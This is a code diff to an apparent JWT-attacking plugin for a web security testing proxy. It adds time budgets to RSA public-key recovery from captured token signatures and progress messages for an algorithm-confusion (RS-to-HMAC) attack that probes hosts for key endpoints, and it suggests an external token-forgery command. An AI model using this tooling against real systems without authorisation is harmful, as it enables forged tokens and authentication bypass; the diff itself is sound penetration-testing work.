@@ -489,7 +489,7 @@ function buildJWKSDocument(publicJwk, kid = "jwt-attacker-key") {
 import { createHash as createHash2 } from "crypto";
 
 // packages/backend/src/crypto/bignum.ts
-var LIMB_BITS = 1n << 21n;
+var LIMB_BITS = 1n << 16n;
 var BASE = 0n;
 var MASK = 0n;
 function ensureInit() {
@@ -721,7 +721,7 @@ function topBits(a, shift) {
   return v >> bitRem;
 }
 var NATIVE_FINISH_BITS = 1n << 15n;
-function gcd(a0, b0, onProgress) {
+function gcd(a0, b0, onProgress, abort) {
   ensureInit();
   let u = a0.slice();
   let v = b0.slice();
@@ -733,7 +733,9 @@ function gcd(a0, b0, onProgress) {
   const startBits = Number(bitLength(u));
   let iter = 0;
   while (bitLength(u) > NATIVE_FINISH_BITS) {
-    if (onProgress && (iter++ & 1023) === 0) onProgress(Number(bitLength(u)), startBits);
+    if ((iter & 255) === 0 && abort?.()) throw new Error("time budget exceeded");
+    if (onProgress && (iter & 1023) === 0) onProgress(Number(bitLength(u)), startBits);
+    iter++;
     const bu = bitLength(u);
     const shift = bu > WINDOW ? bu - WINDOW : 0n;
     let uhat = topBits(u, shift);
@@ -772,7 +774,7 @@ function gcd(a0, b0, onProgress) {
   }
   return fromBigInt(x);
 }
-function pow(base, exp, onProgress) {
+function pow(base, exp, onProgress, abort) {
   ensureInit();
   let result = [1n];
   let b = base.slice();
@@ -780,6 +782,7 @@ function pow(base, exp, onProgress) {
   const total = exp.toString(2).length;
   let done = 0;
   while (e > 0n) {
+    if (abort?.()) throw new Error("time budget exceeded");
     if (e & 1n) result = mul(result, b);
     e >>= 1n;
     if (e > 0n) b = mul(b, b);
@@ -851,10 +854,12 @@ ${lines}
 -----END PUBLIC KEY-----
 `;
 }
-async function recoverRSAPublicKey(jwt0, jwt1, onProgress) {
+async function recoverRSAPublicKey(jwt0, jwt1, onProgress, budgetMs = 24e4) {
   const alg = jwt0.header.alg;
   if (!ALG_TO_HASH[alg]) throw new Error(`Unsupported algorithm: ${alg}`);
   const hashAlg = ALG_TO_HASH[alg];
+  const deadline = Date.now() + budgetMs;
+  const abort = () => Date.now() > deadline;
   const sig0 = b64urlDecode(jwt0.signatureB64);
   const sig1 = b64urlDecode(jwt1.signatureB64);
   const keyLen = sig0.length;
@@ -870,13 +875,13 @@ async function recoverRSAPublicKey(jwt0, jwt1, onProgress) {
   const m1bn = fromBigInt(m1);
   for (const e of [3n, 65537n]) {
     try {
-      onProgress?.(`e=${e}: computing sig^e (~16 MB integers; this can take a few minutes)\u2026`);
-      const p0 = pow(s0bn, e);
-      const p1 = pow(s1bn, e);
+      onProgress?.(`e=${e}: computing sig^e\u2026`);
+      const p0 = pow(s0bn, e, void 0, abort);
+      const p1 = pow(s1bn, e, void 0, abort);
       if (cmp(p0, m0bn) < 0 || cmp(p1, m1bn) < 0) continue;
       const A = sub(p0, m0bn);
       const B = sub(p1, m1bn);
-      onProgress?.(`e=${e}: computing GCD (the slow step \u2014 several minutes)\u2026`);
+      onProgress?.(`e=${e}: computing GCD (the slow step)\u2026`);
       let lastPct = -1;
       const g = gcd(A, B, (remaining, start) => {
         const pct = Math.min(99, Math.floor((1 - remaining / start) * 100));
@@ -884,7 +889,7 @@ async function recoverRSAPublicKey(jwt0, jwt1, onProgress) {
           lastPct = pct;
           onProgress?.(`e=${e}: GCD ${pct}%\u2026`);
         }
-      });
+      }, abort);
       const gInt = toBigInt(g);
       const validates = (nc) => nc > 1n && modpow2(s0, e, nc) === (m0 % nc + nc) % nc;
       for (let k = 1n; k <= 100n; k++) {
@@ -2084,18 +2089,38 @@ async function attackJwt(sdk, requestId, config) {
       }
     }
     if (cfg.enabledAttacks.algConfusion) {
-      await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
-        parsed,
-        request.getHost(),
-        request.getPort(),
-        request.getTls(),
-        cfg,
-        [],
-        // first wave: no recovered keys yet — recovery runs as a second wave below
-        // Surface every discovered key source so the analyst doesn't miss it.
-        (found) => sdk.api.send("jwks-found", { sessionId, ...found }),
-        httpGet
-      ));
+      const isAsym = /^(RS|PS|ES)/.test(parsed.header.alg);
+      if (!isAsym) {
+        sdk.api.send("jwt-key-recovery-progress", {
+          sessionId,
+          message: `Algorithm confusion skipped: token alg is ${parsed.header.alg} (only RS/PS/ES tokens can be downgraded to HMAC).`
+        });
+      } else {
+        sdk.api.send("jwt-key-recovery-progress", {
+          sessionId,
+          message: `Algorithm confusion: probing ${request.getHost()} for exposed JWKS & certificate key endpoints\u2026`
+        });
+        let foundCount = 0;
+        await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
+          parsed,
+          request.getHost(),
+          request.getPort(),
+          request.getTls(),
+          cfg,
+          [],
+          // first wave: no recovered keys yet — recovery runs as a second wave below
+          // Surface every discovered key source so the analyst doesn't miss it.
+          (found) => {
+            foundCount++;
+            sdk.api.send("jwks-found", { sessionId, ...found });
+          },
+          httpGet
+        ));
+        sdk.api.send("jwt-key-recovery-progress", {
+          sessionId,
+          message: foundCount > 0 ? `Algorithm confusion: found ${foundCount} key endpoint(s) \u2014 see the cyan banner.` : `Algorithm confusion: no exposed JWKS/cert endpoints found on ${request.getHost()} (expected for "no exposed key" targets \u2014 use key recovery).`
+        });
+      }
     }
     sdk.console.log(`[JWT Attacker] built ${attacks.length} attack variant(s)`);
     for (const a of attacks) {
@@ -2147,13 +2172,31 @@ async function attackJwt(sdk, requestId, config) {
     sdk.api.send("jwt-attack-started", { sessionId, requestId, total: firstWave.length });
     await sendAttacks(firstWave);
     if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
-      try {
-        const host = request.getHost();
-        const historyJWTs = recoveryCandidates;
+      const host = request.getHost();
+      const historyJWTs = recoveryCandidates;
+      const fullTok = (j) => `${j.headerB64}.${j.payloadB64}.${j.signatureB64}`;
+      const emitExternalHint = () => {
         if (historyJWTs.length >= 2) {
           sdk.api.send("jwt-key-recovery-progress", {
             sessionId,
-            message: `Found ${historyJWTs.length} distinct RSA JWT(s) from ${host} \u2014 attempting public-key recovery (this can take a while)\u2026`
+            message: `For fast recovery run rsa_sign2n externally:  python3 jwt_forgery.py "${fullTok(historyJWTs[0])}" "${fullTok(historyJWTs[1])}"  \u2014 then paste the recovered public key into Configuration \u2192 Public Key and re-run with Algorithm Confusion.`
+          });
+        }
+      };
+      try {
+        sdk.api.send("jwt-key-recovery-progress", {
+          sessionId,
+          message: `Key recovery: scanned HTTP history of ${host} \u2014 found ${historyJWTs.length} distinct RS/PS JWT(s).`
+        });
+        if (historyJWTs.length < 2) {
+          sdk.api.send("jwt-key-recovery-progress", {
+            sessionId,
+            message: "Key recovery needs \u22652 DISTINCT same-host RS/PS JWTs (different signatures, same key). Capture more (e.g. log in again so the app issues a second token), then re-run. Skipping recovery."
+          });
+        } else {
+          sdk.api.send("jwt-key-recovery-progress", {
+            sessionId,
+            message: "Attempting public-key recovery (e=3 is fast; e=65537 runs under a ~4-minute budget and aborts if it can't finish \u2014 it's O(n\xB2) without GMP)\u2026"
           });
           const keyResults = await recoverPublicKeyFromJWTs(
             historyJWTs,
@@ -2168,10 +2211,17 @@ async function attackJwt(sdk, requestId, config) {
               sdk.api.send("jwt-attack-started", { sessionId, requestId, total: attacks.length + 1 });
               await sendAttacks(extra);
             }
+          } else {
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: "In-browser recovery did not finish (e=65537 is too slow here)."
+            });
+            emitExternalHint();
           }
         }
       } catch (e) {
-        errors.push(`[keyRecovery] ${e.message}`);
+        sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Key recovery stopped: ${e.message}.` });
+        emitExternalHint();
         sdk.console.log(`[JWT Attacker] key recovery failed: ${e.message}`);
       }
     }
